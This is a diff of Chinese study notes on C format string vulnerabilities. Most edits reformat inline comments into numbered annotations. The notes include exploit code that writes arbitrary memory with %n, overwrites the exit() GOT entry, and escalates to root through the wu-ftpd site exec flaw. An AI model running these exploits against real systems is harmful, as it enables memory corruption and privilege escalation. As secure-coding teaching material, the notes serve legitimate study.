@@ -43,7 +43,7 @@ int main(int argc, char * argv[]) {
 			```
 
 	=== "varargs"
-		varargs运行在Unix System V，使用定义于varargs.h中的宏，例如`int average(va_list) va_dcl`
+		varargs运行在Unix System V，使用定义于`varargs.h`中的宏，例如`int average(va_list) va_dcl`
 			```c
 			/* 使用varargs实现average函数 */
 			int average(va_alist) va_dcl {
@@ -112,29 +112,36 @@ int main(int argc, char * argv[]) {
 * 宽度（width）
 	- 指定输出字符的最小个数的十进制非负整数。如果输出的字符个数比指定的宽度小，就用空白字符补足
 	- 如果使用星号（*）来指定宽度，则宽度将由参数列表中的一个int型的值提供
-		```c
-		/* An example using '*' */
-		printf("%0*d", 5, 3); /* 00003 is output */
+
+        ```c
+		printf("%0*d", 5, 3); /* (1) */
 		```
+
+        1. 输出`00003`
+
 * 精度（precision）
 	- 用来指示打印字符个数、小数位数或者有效数字个数的非负十进制整数
 	- 可能会引起输出的截断或浮点值的舍入
 	- 如果精度域是一个星号（*），那么它的值就由参数列表中的一个int参数提供
-		```c
-		/* An example using '*' */
-		printf("%.*f", 3, 3.14159265); /* outputs 3.142  */
+
+        ```c
+		printf("%.*f", 3, 3.14159265); /* (1)  */
 		```
+
+        1. 输出 `3.142`
+
 * Visual C++中的长度修饰符
 	- l32 ~ `l`；l64 ~ `ll`
 
 ## 漏洞利用
 ### 缓冲区溢出
+
 ```c
 char buffer[512];
-sprintf(buffer,"Wrong command: %s\n",user);
+sprintf(buffer,"Wrong command: %s\n",user); // (1)
 ```
 
-* 当`user`大于512-16(`"Wrong command: "`)-1字节时，就会越界写
+1. 当`user`大于512-16(`"Wrong command: "`)-1字节时，就会越界写
 
 ### 可伸展的缓冲区
 ```c hl_lines="3"
@@ -193,7 +200,8 @@ int func(char *user) {
 	* 攻击者就能够在调用函数的自动变量中插入一个地址
 		- 如果格式字符串被存储为一个自动变量，那么地址就能被插入在字符串的开始部分。
 	* 例子
-		```c hl_lines="2"
+
+        ```c hl_lines="2"
 		char format[32];
 		strcpy(format,"%08x.%08x.%08x.%s");
 		//strcpy(format,"%s");  //format = "addr[%x...%x]%s"
@@ -208,24 +216,35 @@ int func(char *user) {
 === "覆写内存"
 
 	* 格式化符`%n`：到`%n`位置已经输出的字符总数
-		```c hl_lines="2-3"
+
+        ```c hl_lines="2-3"
 		int i;
-		printf("hello%n\n",(int *)&i); //(1) after this, i = 5, before %n we have already write 5 characters(h-e-l-l-o).
-		printf("\xdc\xf5\x42\x01%08x.%08x.%08x%n",1,2,3); //(2) after this, [0x0142f5dc]=28(8x3+4)
+		printf("hello%n\n",(int *)&i); //(1)
+		printf("\xdc\xf5\x42\x01%08x.%08x.%08x%n",1,2,3); //(2)
 		```
-	* 格式化符`%u`：控制写入的字符个数（“宽度”）
+
+        1. after this, i = `5`, before `%n` we have already write `5` characters(h-e-l-l-o).
+        2. after this, `[0x0142f5dc]=28(8x3+4)`
+
+    * 格式化符`%u`：控制写入的字符个数（“宽度”）
 		- 每一个格式字符串都耗用两个参数：
 			1. 转换指示符%u所使用的整数值
 			2. 输出的字符个数
-		```c hl_lines="2-3"
+
+        ```c hl_lines="2-3"
 		int i;
-		printf("%10u%n",1,&i); //i = 10
-		printf("%100u%n",1,&i); //i = 100
+		printf("%10u%n",1,&i); //(1)
+		printf("%100u%n",1,&i); //(2)
 		```
+
+        1. i = `10`
+        2. i = `100`
+
 	* 写一个地址
 
 		- 大多数CISC中：写入四个字节 → 递增地址 → 再写入四个字节 ...
-			```c
+
+            ```c
 			printf("%16u%n%16u%n%32u%n%64u%n", 1, (int *) &foo[0], 1, (int *) &foo[1], 1, (int *) &foo[2], 1, (int *) &foo[3]);
 			//计数器没有被重置，所以第一个%16u%n写入16，第二个%16u%n写32字节，以此类推
 			//或者...
@@ -237,10 +256,11 @@ int func(char *user) {
 
 			* 也可以在地址递减时，从高位内存写到低位内存
 		- 利用代码
-			```c linenums="1" hl_lines="12 21 30 39"
-			static unsigned int already_written; //(1) 用于存储输出的字符个数（等于格式化输出函数的输出计数器的值）
-			static unsigned int width_field; //(2) 存储有转换规范%n所需要的宽度域的值
-			static unsigned int write_byte; //(3) 包含下一个将要写入的字节值
+
+            ```c linenums="1" hl_lines="12 21 30 39"
+			static unsigned int already_written; //(1)
+			static unsigned int width_field; //(2)
+			static unsigned int write_byte; //(3)
 			static char buffer[256];
 			already_written = 506;
 
@@ -280,13 +300,17 @@ int func(char *user) {
 			strcat(format, buffer);
 			```
 
+            1. 用于存储输出的字符个数（等于格式化输出函数的输出计数器的值）
+            2. 存储有转换规范`%n`所需要的宽度域的值
+            3. 包含下一个将要写入的字节值
+
 		- 覆写内存
 
 			```c
 			unsigned char exploit[1024] = "\x90\x90\x90...\x90";
 			char format[1024];
-			strcpy(format, "\xaa\xaa\xaa\xaa");  //哑整数
-			strcat(format, "\xdc\xf5\x42\x01");  //地址
+			strcpy(format, "\xaa\xaa\xaa\xaa");  //(1)
+			strcat(format, "\xdc\xf5\x42\x01");  //(2)
 			strcat(format, "\xaa\xaa\xaa\xaa");
 			strcat(format, "\xdd\xf5\x42\x01");
 			strcat(format, "\xaa\xaa\xaa\xaa");
@@ -294,11 +318,15 @@ int func(char *user) {
 			strcat(format, "\xaa\xaa\xaa\xaa");
 			strcat(format, "\xdf\xf5\x42\x01");
 			for (i = 0; i < 61; i++) {
-			   strcat(format, "%x"); //将参数指针步进到格式字符串的起点以及第一个哑整数/地址对
+			   strcat(format, "%x"); //(3)
 			}
 			/* code to write address goes here */
 			printf(format);
 			```
+
+            1. 哑整数
+            2. 地址
+            3. 将参数指针步进到格式字符串的起点以及第一个哑整数/地址对
 
 ### 国际化
 - 格式字符串和消息文本通常被移动到由程序在运行时打开的外部目录或文件中
@@ -320,6 +348,7 @@ int func(char *user) {
 - Linux利用若干例
 
     === "例1"
+
         ```c
         /* Linux 利用一例 */
         #include <stdio.h>
@@ -330,9 +359,9 @@ int func(char *user) {
             int i;
             unsigned char format_str[1024];
             strcpy(format_str, "\xaa\xaa\xaa\xaa");
-            strcat(format_str, "\xb4\x9b\x04\x08"); //(1) exit()函数的GOT入口的地址(0x08049bb4)被连接到格式字符串
+            strcat(format_str, "\xb4\x9b\x04\x08"); //(1)
             strcat(format_str, "\xcc\xcc\xcc\xcc");
-            strcat(format_str, "\xb6\x9b\x04\x08"); //(2) 该地址被+2后(0x08049bb6)也连接到格式字符串
+            strcat(format_str, "\xb6\x9b\x04\x08"); //(2)
             for (i = 0; i < 3; i++) {
                 strcat(format_str, "%x");
             }
@@ -343,7 +372,11 @@ int func(char *user) {
         }
         ```
 
+        1. `exit()`函数的GOT入口的地址(`0x08049bb4`)被连接到格式字符串
+        2. 该地址被+2后(`0x08049bb6`)也连接到格式字符串
+
     === "例2"
+
         ```c
         /* Linux覆写内存 */
         static unsigned int already_written, width_field;
@@ -380,18 +413,25 @@ int func(char *user) {
 	* 有些系统（如System V）有下限值，如9
 	* GCC中可以通过`sysconf(_SC_NL_ARGMAX)`获得运行时的有效值
 - 当使用数字式参数规范时，要想指定第n个参数，格式字符串中所有从第一个到第n-1个前导参数都要被指定。在包含有如`%n$`形式的转换规范的格式字符串中，参数列表中的数字式参数可视需要被从格式字符串中引用多次。
-	```c hl_lines="2-3"
+
+    ```c hl_lines="4-5"
 	int i, j, k = 0;
 
 	printf(
-		  "%4$5u%3$n%5$5u%2$n%6$5u%1$n\n",  //%4$5u 取第四个参数（这里是常数5），将输出格式化为无符号的十进制整数，宽度为5；%3$n 将当前输出计数器的值（5）写到第三个参数(&i)所指定的地址；以此类推
+		  "%4$5u%3$n%5$5u%2$n%6$5u%1$n\n",  //(1)
 		  &k, &j, &i, 5, 6, 7
-		);          //output "    5    6    7" (其中5，6，7的宽度都是5)
+      );          //(2)
 
-	printf("i = %d, j = %d, k = %d\n", i, j, k); //output "i = 5, j = 10, k = 15"
+	printf("i = %d, j = %d, k = %d\n", i, j, k); //(3)
 	```
+
+    1. `%4$5u` 取第四个参数（这里是常数`5`），将输出格式化为无符号的十进制整数，宽度为`5`；`%3$n` 将当前输出计数器的值（`5`）写到第三个参数(`&i`)所指定的地址；以此类推
+    2. 输出 `"    5    6    7"` (其中5，6，7的宽度都是5)
+    3. 输出 `"i = 5, j = 10, k = 15"`
+
 - 参数存取内存写
-	```c hl_lines="13 23"
+
+    ```c hl_lines="13 23"
 	static unsigned int already_written, width_field;
 	static unsigned int write_word;
 	static char convert_spec[256];
@@ -574,8 +614,7 @@ int func(char *user) {
 	- wu-ftpd 2.6.1之前版本的`insite_exec()`函数中存在一个格式字符串漏洞
     - site exec的参数未经验证，可能导致任意命令执行，用户可能会利用命令达到权限提升的目的
 
-        ```c
-        /* duh.c */
+        ```c title="duh.c"
         main() {
            seteuid(0);
            setegid(0);
@@ -584,18 +623,22 @@ int func(char *user) {
         }
         ```
 
-        ```shell hl_lines="5 7"
+        ```bash hl_lines="5 7"
         $ make duh
         $ ftp -n localhost
         user: <userid>
         password: <passwd>
         ftp> quote site exec bash -c id
-        # if vulnerable, 'uid=0, gid=0, euid=<yourid>, egid=<your-gids>' will be given
-        ftp> quote site exec bash -c duh # 前述duh.c
+        # (1)
+        ftp> quote site exec bash -c duh # (2)
         ftp> quit
         $ ./sh
-        #bash   # 原来可能不够权限运行shell，现在权限提升了，可以运行了
+        # (3)
         ```
+
+        1. if vulnerable, 'uid=0, gid=0, euid=<yourid>, egid=<your-gids>' will be given
+        2. 前述`duh.c`文件
+        3. 原来可能不够权限运行shell，现在权限提升了，可以运行了
 
 * CDE ToolTalk(CVE-2001-0717)
 	- 在所有版本的CDE ToolTalk RPC数据库服务器上都存在一个可被远程利用的格式字符串漏洞
